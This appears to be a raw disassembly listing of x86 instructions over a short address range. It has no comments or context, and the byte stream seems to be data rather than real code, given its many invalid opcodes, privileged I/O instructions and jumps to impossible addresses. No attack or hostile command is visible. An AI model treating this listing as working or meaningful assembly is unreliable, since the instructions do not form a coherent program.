  40d6eb:	pop    esp
  40d6ec:	mov    cl,0x8a
  40d6ee:	adc    al,0x52
  40d6f0:	in     al,dx
  40d6f1:	ja     0x40d749
  40d6f3:	mov    bl,0x3e
  40d6f5:	icebp  
  40d6f6:	in     eax,dx
  40d6f7:	arpl   WORD PTR [eax-0x4e7e5567],ax
  40d6fd:	das    
  40d6fe:	jne    0x40d6ee
  40d700:	dec    ebx
  40d701:	pop    edx
  40d702:	scas   eax,DWORD PTR es:[edi]
  40d703:	xor    edi,DWORD PTR [esi+0x16]
  40d706:	(bad)  
  40d707:	imul   ebp,DWORD PTR [ecx],0x172e7517
  40d70d:	xor    dh,ah
  40d70f:	clc    
  40d710:	ins    DWORD PTR es:[edi],dx
  40d711:	ins    DWORD PTR es:[edi],dx
  40d712:	push   0x6e
  40d714:	cmp    al,al
  40d716:	stos   DWORD PTR es:[edi],eax
  40d717:	arpl   WORD PTR [ebp+0x77],dx
  40d71a:	push   cs
  40d71b:	mov    WORD PTR [ecx+0x6b75b5bf],gs
  40d721:	imul   esi,ecx,0xffffff92
  40d724:	ja     0x40d724
  40d726:	add    ch,BYTE PTR [edi]
  40d728:	sar    DWORD PTR [ecx-0x3c],1
  40d72b:	pop    edx
  40d72c:	dec    esi
  40d72d:	ds cmp eax,0x7385e6d9
  40d733:	outs   dx,BYTE PTR ds:[esi]
  40d734:	outs   dx,BYTE PTR ds:[esi]
  40d735:	and    al,BYTE PTR [ecx-0x193e5177]
  40d73b:	xchg   esi,eax
  40d73c:	xchg   BYTE PTR [eax+ebp*8],bl
  40d73f:	xor    dh,ch
  40d741:	popf   
  40d742:	pop    ss
  40d743:	dec    ecx
  40d744:	pop    ds
  40d745:	fisttp DWORD PTR [esi-0x19]
  40d748:	or     edx,DWORD PTR [ebp+0x47]
  40d74b:	lods   al,BYTE PTR ds:[esi]
  40d74c:	push   ebx
  40d74d:	sti    
  40d74e:	sbb    al,0x3
  40d750:	pop    edi
  40d751:	xor    ebp,DWORD PTR [eax]
  40d753:	aam    0xe2
  40d755:	mov    edx,0x9aaa6adc
  40d75a:	call   DWORD PTR [ebx]
  40d75c:	sahf   
  40d75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d75e:	iret   
  40d75f:	adc    al,0x49
  40d761:	fidivr WORD PTR [ebp+0x4e]
  40d764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d765:	pop    ds
  40d766:	jns    0x40d71a
  40d768:	repz cwde 
  40d76a:	repnz aas 
  40d76c:	daa    
  40d76d:	inc    edx
  40d76e:	fld    DWORD PTR [ebx-0x5e46953b]
  40d774:	addr16 pop esp
  40d776:	stos   DWORD PTR es:[edi],eax
  40d777:	push   0xf93faead
  40d77c:	imul   esi,DWORD PTR [ebx+0x1bdf64fe],0x725653d3
  40d786:	sub    eax,0x12ce5fe6
  40d78b:	dec    esi
  40d78c:	lea    edi,[edi]
  40d78e:	imul   eax,esp,0x70
  40d791:	cmc    
  40d792:	lea    edx,[ebx-0x5f]
  40d795:	xor    eax,0x85268fd5
  40d79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d79b:	sti    
  40d79c:	ror    BYTE PTR [edi+0x73],1
  40d79f:	pop    eax
  40d7a0:	push   esp
  40d7a1:	lahf   
  40d7a2:	in     al,dx
  40d7a3:	out    dx,al
  40d7a4:	sub    esi,esp
  40d7a6:	mov    edx,0xfbd3c1a5
  40d7ab:	xor    edx,ecx
  40d7ad:	xchg   ebp,eax
  40d7ae:	mov    ebx,0x3d241524
  40d7b3:	jle    0x40d7e1
  40d7b5:	mov    ah,0x0
  40d7b7:	push   ecx
  40d7b8:	push   es
  40d7b9:	stc    
  40d7ba:	test   BYTE PTR [ebp+0x55],0x75
  40d7be:	add    DWORD PTR [eax-0x35],0x79
  40d7c2:	xor    al,0x9e
  40d7c4:	sbb    BYTE PTR [edi+edi*2],bl
  40d7c7:	push   eax
  40d7c8:	adc    DWORD PTR [edi+0x71],esp
  40d7cb:	xchg   ebp,eax
  40d7cc:	inc    eax
  40d7cd:	aam    0xfe
  40d7cf:	data16 data16 ja 0x40d77d
  40d7d3:	cmp    esp,DWORD PTR [ebx+0x2893ef69]
  40d7d9:	xchg   esp,eax
  40d7da:	add    al,0xac
  40d7dc:	lods   eax,DWORD PTR ds:[esi]
  40d7dd:	test   al,0x2f
  40d7df:	stos   DWORD PTR es:[edi],eax
  40d7e0:	mov    esi,0x377a0883
  40d7e5:	icebp  
  40d7e6:	ret    
  40d7e7:	inc    ebp
  40d7e8:	add    eax,0x5db49e60
  40d7ed:	fidiv  DWORD PTR [edi]
  40d7ef:	(bad)  
  40d7f0:	js     0x40d7b1
  40d7f2:	mov    DWORD PTR [edi],0x9b26b657
  40d7f8:	inc    edi
  40d7f9:	mov    bl,0xd4
  40d7fb:	adc    edx,DWORD PTR [eax]
  40d7fd:	fstp   TBYTE PTR ds:0xb4b23aa6
  40d803:	xchg   ecx,eax
  40d804:	(bad)  
  40d805:	cmp    ch,BYTE PTR [ecx+0x79]
  40d808:	mov    esi,eax
  40d80a:	push   cs
  40d80b:	dec    ebp
  40d80c:	js     0x40d7c2
  40d80e:	gs pop ebp
  40d810:	adc    al,0x30
  40d812:	cld    
  40d813:	loope  0x40d84d
  40d815:	sbb    al,BYTE PTR [edx]
  40d817:	test   ch,dh
  40d819:	pop    eax
  40d81a:	repnz das 
  40d81c:	add    DWORD PTR [ecx-0xb],0x1dcb5d9e
  40d823:	cmc    
  40d824:	(bad)  
  40d825:	fmul   QWORD PTR [ecx+0x3286ccc8]
  40d82b:	test   BYTE PTR [ecx+0x652e2b74],ah
  40d831:	stc    
  40d832:	sar    DWORD PTR [eax-0x30],1
  40d835:	test   bh,dl
  40d837:	repnz and edx,0xbf402e54
  40d83e:	mov    edi,0x381b0c5a
  40d843:	push   esp
  40d844:	out    dx,eax
  40d845:	(bad)  
  40d846:	retf   
  40d847:	ins    DWORD PTR es:[edi],dx
  40d848:	xor    al,0xd4
  40d84a:	outs   dx,DWORD PTR ds:[esi]
  40d84b:	pop    ecx
  40d84c:	xchg   esp,eax
  40d84d:	adc    al,0x29
  40d84f:	xor    BYTE PTR [eax],ch
  40d851:	cmp    BYTE PTR [ecx],al
  40d853:	inc    edx
  40d854:	jmp    FWORD PTR [eax+0x5b]
  40d857:	inc    esi
  40d858:	xchg   ebp,eax
  40d859:	push   0x3c
  40d85b:	push   esi
  40d85c:	cmp    edi,DWORD PTR ds:0x6ea2eac6
  40d862:	mov    DWORD PTR [esi+ebp*1+0x37368cd4],ebx
  40d869:	ins    DWORD PTR es:[edi],dx
  40d86a:	push   es
  40d86b:	jmp    0xdd24:0xdec49a8c
  40d872:	push   esi
  40d873:	mov    ebx,0xf7280602
  40d878:	adc    BYTE PTR [ecx+0x6],al
  40d87b:	inc    edx
  40d87c:	jge    0x40d87d
  40d87e:	rcl    BYTE PTR [ebp+ebx*1+0x5a6c3a74],1
  40d885:	(bad)  
  40d886:	xchg   ebp,eax
  40d887:	mov    cl,0xb9
  40d889:	add    dh,0x2a
  40d88c:	fldenv [esi-0x3c]
  40d88f:	push   ecx
  40d890:	scas   eax,DWORD PTR es:[edi]
  40d891:	pop    edx
  40d892:	jmp    0xe0021dcd
  40d897:	mov    esp,0x72fce1aa
  40d89c:	jae    0x40d8fe
  40d89e:	push   cs
  40d89f:	inc    edx
  40d8a0:	sub    BYTE PTR [ebx-0x2e9d4056],al
  40d8a6:	xchg   edx,eax
  40d8a7:	outs   dx,BYTE PTR ds:[esi]
  40d8a8:	std    
  40d8a9:	das    
  40d8aa:	jo     0x40d898
  40d8ac:	ins    BYTE PTR es:[edi],dx
  40d8ad:	cmp    bl,BYTE PTR [ebx]
  40d8af:	(bad)
  40d8b2:	call   0xb4123631
  40d8b7:	lds    edx,FWORD PTR [ebp+0x5e10d767]
  40d8bd:	push   0xd568aa1d
  40d8c2:	cli    
  40d8c3:	dec    BYTE PTR [ebx+0x59]
  40d8c6:	mul    BYTE PTR [ecx+0x55481068]
  40d8cc:	jmp    0x698c07de
  40d8d1:	jecxz  0x40d862
  40d8d3:	rcr    BYTE PTR [edi+0x16],cl
  40d8d6:	sti    
  40d8d7:	mov    al,ds:0x194e5aa3
  40d8dc:	pop    ecx
  40d8dd:	add    eax,0x98d54b9d
  40d8e2:	add    al,BYTE PTR [ebp-0x58]
  40d8e5:	push   esi
  40d8e6:	fld    DWORD PTR [eax+eiz*1-0xb505023]
  40d8ed:	sub    esi,DWORD PTR [eax*2+0x5d180d62]
  40d8f4:	out    dx,eax
  40d8f5:	cmp    bh,BYTE PTR [edx+0x69]
  40d8f8:	push   0xce37fcf0
  40d8fd:	dec    ebp
  40d8fe:	dec    ebp
  40d8ff:	es mov edx,?
  40d902:	push   DWORD PTR [esi]
  40d904:	in     al,0xab
  40d906:	int    0x1c
  40d908:	mov    ebx,esi
  40d90a:	pusha  
  40d90b:	div    BYTE PTR ds:0x4cd9c8c
  40d911:	sti    
  40d912:	cmp    al,0xb3
  40d915:	dec    esi
  40d916:	sbb    cl,0x28
  40d919:	mov    edx,0xc360e1a
  40d91e:	lahf   
  40d91f:	ins    DWORD PTR es:[edi],dx
  40d920:	xchg   ecx,eax
  40d921:	fmul   QWORD PTR [edi-0x54]
  40d924:	mov    BYTE PTR [ebp+0x1054d3c6],dh
  40d92a:	and    dl,al
  40d92c:	lods   eax,DWORD PTR ds:[esi]
  40d92d:	add    cl,BYTE PTR [edx+0x755b64b8]
  40d933:	jns    0x40d967
  40d935:	icebp  
  40d936:	mov    al,ds:0x8f93c2d1
  40d93b:	nop
  40d93c:	or     bl,ah
  40d93e:	lock sub al,0x1
  40d941:	(bad)
  40d945:	sbb    DWORD PTR [edx+0x6656f783],esp
  40d94b:	popa   
  40d94c:	or     esp,DWORD PTR [edi+0x18]
  40d94f:	mov    ds:0x71f51f87,eax
  40d954:	add    al,ch
  40d956:	iret   
  40d957:	hlt    
  40d958:	iret   
  40d959:	arpl   WORD PTR [ebx+0x3],bp
  40d95c:	fld    TBYTE PTR [ebp-0x69bf3ebf]
  40d962:	adc    ebp,ecx
  40d964:	or     ecx,DWORD PTR [esi]
  40d966:	fld    DWORD PTR [edx]
  40d968:	(bad)  
  40d96a:	add    ecx,0x3e7c058
  40d970:	mov    dl,dl
  40d972:	sbb    esp,DWORD PTR [ebp+0xf]
  40d975:	pop    edi
  40d976:	dec    ecx
  40d977:	pop    ss
  40d978:	pusha  
  40d979:	jge    0x40d9a6
  40d97b:	cdq    
  40d97c:	out    dx,eax
  40d97d:	or     cl,BYTE PTR ss:[edi+0x1041596b]
  40d984:	add    dh,BYTE PTR [ebx-0x5]
  40d987:	dec    esi
  40d988:	ror    DWORD PTR [ebx],0xf2
  40d98b:	jmp    DWORD PTR [edx-0x26]
  40d98e:	cmp    eax,0xec634e78
  40d993:	fwait
  40d994:	(bad)  
  40d995:	cld    
  40d996:	mov    al,ah
  40d998:	icebp  
  40d999:	dec    esp
  40d99a:	cld    
  40d99b:	test   eax,0x366d7d55
  40d9a0:	mov    esi,0x3be29a2e
  40d9a5:	jnp    0x40d989
  40d9a7:	dec    ebx
  40d9a8:	push   esp
  40d9a9:	cwde   
  40d9aa:	fxch   st(3)
  40d9ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9ad:	or     dh,BYTE PTR [ebp+0x40520a76]
  40d9b3:	imul   esi,DWORD PTR [edi+0x68],0xffffffc9
  40d9b7:	(bad)  
  40d9b8:	outs   dx,DWORD PTR ds:[esi]
  40d9b9:	leave  
  40d9ba:	les    edi,FWORD PTR [ebp-0x3b]
  40d9bd:	and    al,0x6f
  40d9bf:	and    DWORD PTR [eax+eax*4],eax
  40d9c2:	and    ecx,DWORD PTR [ecx]
  40d9c4:	xor    BYTE PTR [esi-0x305ac06d],ch
  40d9ca:	outs   dx,DWORD PTR ds:[esi]
  40d9cb:	add    eax,0xed3ac57a
  40d9d0:	jecxz  0x40d9b7
  40d9d2:	outs   dx,BYTE PTR ds:[esi]
  40d9d3:	fst    DWORD PTR [eax+0x4164190c]
  40d9d9:	sbb    edx,eax
  40d9db:	inc    ecx
  40d9dc:	cld    
  40d9dd:	scas   al,BYTE PTR es:[edi]
  40d9de:	div    BYTE PTR [ebp-0x80]
  40d9e1:	jmp    0x6bbd3d9b
  40d9e6:	xor    DWORD PTR [bx+di-0x23],esi
  40d9ea:	dec    edx
  40d9eb:	push   ss
  40d9ec:	or     DWORD PTR [esi-0x31d32d2f],edx
  40d9f2:	mov    esi,0x68a415fa
  40d9f7:	xchg   esi,eax
  40d9f8:	mov    ah,0x30
  40d9fa:	xor    edx,ebx
  40d9fc:	cli    
  40d9fd:	call   0x1c8729da
  40da02:	or     edi,ecx
  40da04:	or     eax,0xf284fc1
  40da09:	mov    al,0x31
  40da0b:	cvttps2pi mm5,QWORD PTR [edi]
  40da0e:	mov    esp,0xdb0ab58
  40da13:	xor    DWORD PTR [eax],0x0
  40da16:	sub    eax,0xe1d3f46f
  40da1b:	push   ss
  40da1c:	test   eax,0x1aab8184
  40da21:	loope  0x40d9a8
  40da23:	push   eax
  40da24:	lea    ebx,[edi]
  40da26:	adc    al,BYTE PTR [esi-0x7c]
  40da29:	push   ss
  40da2a:	out    0x25,eax
  40da2c:	add    BYTE PTR [eax+0x5fad9b53],al
  40da32:	mov    esp,0x9e95d44a
  40da37:	das    
  40da38:	in     al,dx
  40da39:	cmp    al,0x8c
  40da3b:	sbb    BYTE PTR ds:0x4175d73f,dh
  40da41:	pusha  
  40da42:	mov    cl,0xdb
  40da44:	fcomp  DWORD PTR [edx-0x6d73fd85]
  40da4a:	test   DWORD PTR ss:[eax+eiz*4-0x28fc07cd],edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xb0,eax
  40da6e:	mov    edx,0xa23255a5
  40da73:	jle    0x40daf3
  40da75:	jo     0x40daf0
  40da77:	jle    0x40daf7
  40da79:	push   es
  40da7a:	jl     0x40da46
  40da7c:	retf   
  40da7d:	test   BYTE PTR [ecx],0x3e
  40da80:	addr16 mov ds:0x2fa6,al
  40da84:	and    eax,ebx
  40da86:	add    BYTE PTR [ebp+0x7594ee6d],0x56
  40da8d:	and    BYTE PTR [edx],bl
  40da8f:	into   
  40da90:	in     eax,dx
  40da91:	and    al,0xf6
  40da93:	jno    0x40daa7
  40da95:	pop    ss
  40da96:	and    DWORD PTR [eax-0x34],ecx
  40da99:	ins    DWORD PTR es:[edi],dx
  40da9a:	data16 in al,dx
  40da9c:	xor    DWORD PTR [eax-0x6af46f64],ebp
  40daa2:	push   edi
  40daa3:	mov    cl,0xd8
  40daa5:	call   0x585c8e0a
  40daaa:	leave  
  40daab:	jne    0x40da35
  40daad:	scas   al,BYTE PTR es:[edi]
  40daae:	data16 gs xor cl,bh
  40dab2:	nop
  40dab3:	jns    0x40dac8
  40dab5:	ret    0x668f
  40dab8:	iret   
  40dab9:	add    eax,0x25deb1be
  40dabe:	rcr    eax,cl
  40dac0:	fisttp WORD PTR [ecx]
  40dac2:	jo     0x40daa7
  40dac4:	jne    0x40da99
  40dac6:	and    BYTE PTR [edx-0x7daf4b0],dh
  40dacc:	pop    esp
  40dacd:	repnz mov ebp,0x97f9eeaf
  40dad3:	mov    edi,0x777b7b2e
  40dad8:	inc    esp
  40dad9:	inc    ebx
  40dada:	aas    
  40dadb:	into   
  40dadc:	xchg   ebp,eax
  40dadd:	(bad)  
  40dade:	or     al,BYTE PTR [ebx+0x1d]
  40dae1:	mov    BYTE PTR [ebx-0x64],bh
  40dae4:	adc    edi,esi
  40dae6:	jo     0x40dab6
  40dae8:	pop    esp
  40dae9:	fmul   DWORD PTR [edi]
  40daeb:	inc    ebx
  40daec:	pushf  
  40daed:	xor    al,0x5e
  40daef:	or     bl,BYTE PTR [edi+0x7fc5002e]
  40daf5:	ss ds pop edi
  40daf8:	mov    esp,0x3a693224
  40dafd:	or     eax,0x8bdb6b5c
  40db02:	fwait
  40db03:	pushf  
  40db04:	xchg   edi,eax
  40db05:	mov    edi,edx
  40db07:	in     eax,dx
  40db08:	dec    esi
  40db09:	mov    DWORD PTR [ebp+0x39],ebp
  40db0c:	jg     0x40dac5
  40db0e:	mov    ds:0x3ec3b5ca,al
  40db13:	pusha  
  40db14:	pushf  
  40db15:	push   cs
  40db16:	mov    ecx,0xe3ec5e69
  40db1b:	into   
  40db1c:	jns    0x40db12
  40db1e:	sub    BYTE PTR [ecx],dl
  40db20:	call   0x8352f761
  40db25:	xchg   ah,al
  40db27:	mov    esi,0x16a37a67
  40db2c:	cli    
  40db2d:	dec    BYTE PTR [ebp-0x6bf1c790]
  40db33:	leave  
  40db34:	add    eax,0xc58146bb
  40db39:	int3   
  40db3a:	(bad)  
  40db3b:	xchg   esp,eax
  40db3c:	mov    ds:0x6213aa44,al
  40db41:	call   FWORD PTR [edx+esi*1]
  40db44:	or     dl,BYTE PTR [ebx+0x7d89c69d]
  40db4a:	add    eax,edx
  40db4c:	and    eax,0x2e854ace
  40db51:	sub    DWORD PTR ds:0xf686eec9,esi
  40db57:	jmp    0x97b9a6d4
  40db5c:	mov    ds:0xf56208ad,al
  40db61:	outs   dx,DWORD PTR ds:[esi]
  40db62:	jmp    0x40db7b
  40db64:	and    dh,BYTE PTR [ecx-0xbdfa1a5]
  40db6a:	dec    esp
  40db6b:	adc    eax,0xaadaf3c3
  40db70:	js     0x40db24
  40db72:	sbb    ch,BYTE PTR [ebx]
  40db74:	lahf   
  40db75:	or     DWORD PTR [eax],0xffffffc5
  40db78:	inc    eax
  40db79:	mov    al,BYTE PTR [ebp-0x5a]
  40db7c:	mov    bh,0x2e
  40db7e:	sti    
  40db7f:	mov    dh,ch
  40db81:	sahf   
  40db82:	ds push ebx
  40db84:	loope  0x40db68
  40db86:	jbe    0x40db32
  40db88:	mov    ecx,ebx
  40db8a:	mov    eax,0x39dce0bc
  40db8f:	push   0xa3f091e7
  40db94:	mov    ah,0x8b
  40db96:	(bad)  
  40db97:	push   0xda9bea24
  40db9c:	inc    ecx
  40db9d:	mov    al,0x2c
  40db9f:	cmp    eax,0xce706772
  40dba4:	enter  0xf19b,0xf0
  40dba8:	xor    DWORD PTR [ebp+edx*2+0xb3371ff],edi
  40dbaf:	jg     0x40db63
  40dbb1:	call   0x3f54b8f6
  40dbb6:	pop    esp
  40dbb7:	repnz (bad) 
  40dbb9:	fldcw  WORD PTR [esi+0x7cf5abc0]
  40dbbf:	inc    eax
  40dbc0:	or     eax,0x54baeff0
  40dbc5:	inc    ebp
  40dbc6:	cmp    edx,DWORD PTR [bx+si-0x1bea]
  40dbcb:	call   0xca37:0xc8c04cf9
  40dbd2:	xchg   ebx,eax
  40dbd3:	fld    TBYTE PTR [ecx]
  40dbd5:	mov    ds:0xc9454c5b,al
  40dbda:	out    0xe0,eax
  40dbdc:	aaa    
  40dbdd:	cmp    edi,DWORD PTR [eax+0x1d047810]
  40dbe3:	(bad)  
  40dbe4:	fdivr  QWORD PTR [edi]
  40dbe6:	adc    BYTE PTR [ebp+eiz*8+0x27f4ad9a],bh
  40dbed:	mov    dh,0xdb
  40dbef:	(bad)  
  40dbf0:	lods   al,BYTE PTR ds:[esi]
  40dbf1:	fsub   DWORD PTR ds:0xcbb32515
  40dbf7:	fild   QWORD PTR [ecx+0x540ec812]
  40dbfd:	mov    ds:0xe55ca2a3,eax
  40dc02:	and    al,0xe6
  40dc04:	push   cs
  40dc05:	aaa    
  40dc06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc07:	jmp    FWORD PTR [esi+0x4fec1994]
  40dc0d:	dec    ebp
  40dc0e:	pop    ebx
  40dc0f:	cmp    BYTE PTR [edx-0x3a],0xea
  40dc13:	push   edx
  40dc14:	mov    ebp,0x1f600448
  40dc19:	ret    
  40dc1a:	jge    0x40dbf8
  40dc1c:	sbb    al,0x4f
  40dc1e:	bound  eax,QWORD PTR [ebx]
  40dc20:	mov    eax,0xa721510b
  40dc25:	dec    esp
  40dc26:	xor    DWORD PTR [ebx],edx
  40dc28:	and    BYTE PTR [edx],0xb0
  40dc2b:	cmp    al,0x71
  40dc2d:	mov    edi,DWORD PTR [esi+ebx*8-0xbc33a53]
  40dc34:	xor    eax,0xe9c89cc6
  40dc39:	mov    esp,0x5c2f7b16
  40dc3e:	add    al,0x4a
  40dc40:	pop    ds
  40dc41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc42:	jl     0x40dbde
  40dc44:	je     0x40dca2
  40dc46:	xchg   ebp,eax
  40dc47:	loope  0x40dc35
  40dc49:	xchg   ebp,eax
  40dc4a:	inc    esi
  40dc4b:	and    DWORD PTR [ecx+0x16d042e2],ecx
  40dc51:	jno    0x40dc67
  40dc53:	adc    dl,cl
  40dc55:	fldenv [esp+eax*2]
  40dc58:	jmp    0x43fa:0x6f2e0149
  40dc5f:	ficom  DWORD PTR [edi]
  40dc61:	and    dl,dh
  40dc63:	outs   dx,BYTE PTR ds:[esi]
  40dc64:	jp     0x40dc46
  40dc66:	fiadd  WORD PTR ds:0xe503aca3
  40dc6c:	xchg   edx,eax
  40dc6d:	fadd   QWORD PTR [edi-0x5074b94c]
  40dc73:	repnz and BYTE PTR [edx+0x12],dl
  40dc77:	adc    dl,BYTE PTR [edx-0x3d]
  40dc7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc7b:	pop    esp
  40dc7c:	push   edi
  40dc7d:	call   0x9f10:0xffbb915c
  40dc84:	ins    DWORD PTR es:[di],dx
  40dc86:	xor    DWORD PTR [edx],ebx
  40dc88:	inc    esi
  40dc89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc8a:	cmp    eax,0x1e2fec
  40dc8f:	jo     0x40dd04
  40dc91:	enter  0x1836,0x3f
  40dc95:	mov    ds:0x7ec38614,eax
  40dc9a:	jnp    0x40dd00
  40dc9c:	imul   ebp,DWORD PTR [edi-0x33005572],0x12f52b5d
  40dca6:	sub    eax,0x345f25f0
  40dcab:	mov    WORD PTR [ebp-0x5a],es
  40dcae:	sub    al,0x51
  40dcb0:	cwde   
  40dcb1:	leave  
  40dcb2:	pop    ebx
  40dcb3:	mov    edi,0x66b93ec2
  40dcb8:	out    0xfa,al
  40dcba:	lahf   
  40dcbb:	mov    ds:0xd84565bd,al
  40dcc0:	rcr    dl,0xe8
  40dcc3:	mov    ah,0xca
  40dcc5:	sub    esp,DWORD PTR [ebx+0x7a28563f]
  40dccb:	adc    eax,0x4f4a836
  40dcd0:	popf   
  40dcd1:	adc    eax,edi
  40dcd3:	pushf  
  40dcd4:	(bad)  
  40dcd5:	leave  
  40dcd6:	fs jg  0x40dcb9
  40dcd9:	pop    es
  40dcda:	pop    eax
  40dcdb:	and    dh,al
  40dcdd:	test   eax,0x707d43e2
  40dce2:	or     esp,DWORD PTR [edi+0x24]
  40dce5:	dec    edi
  40dce6:	xchg   DWORD PTR [eax+0x2a539b42],esp
  40dcec:	lahf   
  40dced:	cmp    esi,DWORD PTR [edi+0x39]
  40dcf0:	mov    esi,0x7c582ab5
  40dcf5:	data16 and cl,BYTE PTR [edx+0x4d8d1fcd]
  40dcfc:	lea    esi,[esi]
  40dcfe:	dec    ecx
  40dcff:	cmp    eax,0x58ebe6b2
  40dd04:	push   ss
  40dd05:	xor    al,0x40
  40dd07:	and    DWORD PTR [ecx-0x80],esi
  40dd0a:	test   DWORD PTR [ebx+0x5c7c4f0b],edi
  40dd10:	int    0x30
  40dd12:	imul   esp,DWORD PTR ds:0x7af001e2,0x78dfff39
  40dd1c:	(bad)  
  40dd1d:	cdq    
  40dd1e:	shr    cl,1
  40dd20:	jb     0x40dd59
  40dd22:	xor    cl,cl
  40dd24:	adc    esp,DWORD PTR [ebx+0x72]
  40dd27:	loopne 0x40dd73
  40dd29:	call   0x1f9a8c60
  40dd2e:	inc    esi
  40dd2f:	lds    ebp,FWORD PTR [ebx-0x5c3c4a2e]
  40dd35:	call   0x5e1e:0xbbf08ec5
  40dd3c:	sub    edx,DWORD PTR [eax-0x11]
  40dd3f:	leave  
  40dd40:	(bad)
  40dd44:	cmp    edx,0x79
  40dd47:	stos   DWORD PTR es:[edi],eax
  40dd48:	(bad)  
  40dd49:	xor    BYTE PTR [ecx+0x5e72a71f],bh
  40dd4f:	adc    eax,0xea9179bb
  40dd54:	cdq    
  40dd55:	pop    ebp
  40dd56:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd58:	aam    0x91
  40dd5a:	pop    ebp
  40dd5b:	ret    0x9f7d
  40dd5e:	call   0xd6c74f6e
  40dd63:	retf   0x6d28
  40dd66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd67:	add    al,0x43
  40dd69:	arpl   ax,cx
  40dd6b:	loop   0x40dd28
  40dd6d:	fs ins BYTE PTR es:[edi],dx
  40dd6f:	push   edx
  40dd70:	xchg   edx,eax
  40dd71:	out    0xc4,al
  40dd73:	add    dh,al
  40dd75:	repnz pushf 
  40dd77:	fadd   DWORD PTR [edi+0x18635312]
  40dd7d:	fsub   st,st(7)
  40dd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd81:	fcmovu st,st(0)
  40dd83:	(bad)  
  40dd84:	pop    ecx
  40dd85:	sahf   
  40dd86:	adc    bl,BYTE PTR [edx+0x43b83103]
  40dd8c:	aad    0x22
  40dd8e:	push   edx
  40dd8f:	je     0x40dd5a
  40dd91:	cmp    DWORD PTR ss:[edx],ebx
  40dd94:	mov    eax,0x3c8e6639
  40dd99:	js     0x40dd6f
  40dd9b:	and    ebx,ebp
  40dd9d:	stos   DWORD PTR es:[edi],eax
  40dd9e:	cdq    
  40dd9f:	mov    al,0x13
  40dda1:	dec    ebx
  40dda2:	mov    edx,0x3fe3e1c5
  40dda7:	mov    dh,BYTE PTR [ebp+0x5]
  40ddaa:	dec    ebp
  40ddab:	inc    ecx
  40ddac:	(bad)  
  40ddad:	inc    DWORD PTR [ecx+0x17]
  40ddb0:	xchg   edx,eax
  40ddb1:	ins    DWORD PTR es:[edi],dx
  40ddb2:	jno    0x40ddbc
  40ddb4:	xlat   BYTE PTR ds:[ebx]
  40ddb5:	and    BYTE PTR [eax],ah
  40ddb7:	sub    esp,DWORD PTR [ecx-0x1e1f794]
  40ddbd:	(bad)  
  40ddbe:	jb     0x40de0b
  40ddc0:	aam    0xca
  40ddc2:	pop    esp
  40ddc3:	sub    cl,dl
  40ddc5:	repnz test ah,0x91
  40ddc9:	inc    ebx
  40ddca:	inc    edx
  40ddcb:	stos   BYTE PTR es:[edi],al
  40ddcc:	es dec ecx
  40ddce:	pop    ebx
  40ddcf:	mov    al,0x18
  40ddd1:	jmp    0xf7dfa711
  40ddd6:	rol    BYTE PTR ds:0x44edbd5b,cl
  40dddc:	sar    ah,0x0
  40dddf:	fsubr  DWORD PTR [edx+ebp*8]
  40dde2:	aam    0x8d
  40dde4:	pop    ebx
  40dde5:	mov    esi,0xf40f0dc8
  40ddea:	and    al,0x8e
  40ddec:	std    
  40dded:	jl     0x40de31
  40ddef:	pop    ecx
  40ddf0:	xchg   DWORD PTR [eax-0x4f],ebp
  40ddf3:	(bad)  
  40ddf4:	stc    
  40ddf5:	icebp  
  40ddf6:	sub    eax,0x76ff2ef9
  40ddfb:	and    esi,DWORD PTR [ebp-0x48]
  40ddfe:	mov    ds:0xc8d49c5c,eax
  40de03:	enter  0x565,0xdc
  40de07:	call   0xc5c0:0x3795624a
  40de0e:	mov    ch,0x29
  40de10:	mov    eax,0x3cabc509
  40de15:	jno    0x40de26
  40de17:	aad    0x8d
  40de19:	inc    ebx
  40de1a:	cmp    esi,eax
  40de1c:	sahf   
  40de1d:	pop    ebp
  40de1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de1f:	out    0xc4,eax
  40de21:	mov    BYTE PTR [edx-0x35],cl
  40de24:	cmp    ch,dl
  40de26:	les    edi,FWORD PTR [ebx+0x4e011094]
  40de2c:	cmp    BYTE PTR [edi],ch
  40de2e:	(bad)  
  40de2f:	jl     0x40de8c
  40de31:	pop    ecx
  40de32:	jecxz  0x40deb2
  40de34:	add    DWORD PTR [edx],edi
  40de36:	or     ch,BYTE PTR [ebp+0x4dccde66]
  40de3c:	std    
  40de3d:	lods   eax,DWORD PTR ds:[esi]
  40de3e:	ins    DWORD PTR es:[edi],dx
  40de3f:	cld    
  40de40:	outs   dx,DWORD PTR ds:[esi]
  40de41:	(bad)  
  40de42:	cwde   
  40de43:	push   eax
  40de44:	pop    edi
  40de45:	test   al,0x4
  40de47:	and    eax,0x956f3585
  40de4c:	push   ebx
  40de4d:	cmp    eax,ebx
  40de4f:	xor    bl,cl
  40de51:	mov    dl,0xc5
  40de53:	aad    0x70
  40de55:	sbb    BYTE PTR [ecx+0x25],bl
  40de58:	ret    0xd58b
  40de5b:	inc    ecx
  40de5c:	je     0x40ddf0
  40de5e:	cmc    
  40de5f:	push   cs
  40de60:	ins    DWORD PTR es:[edi],dx
  40de61:	inc    esi
  40de62:	pop    ss
  40de63:	scas   eax,DWORD PTR es:[edi]
  40de64:	leavew 
  40de66:	adc    BYTE PTR [edx-0x7e],bh
  40de69:	sub    BYTE PTR [edx+0x7e],bl
  40de6c:	inc    edx
  40de6d:	das    
  40de6e:	mov    bl,0x4b
  40de70:	push   ebx
  40de71:	sub    al,0x3b
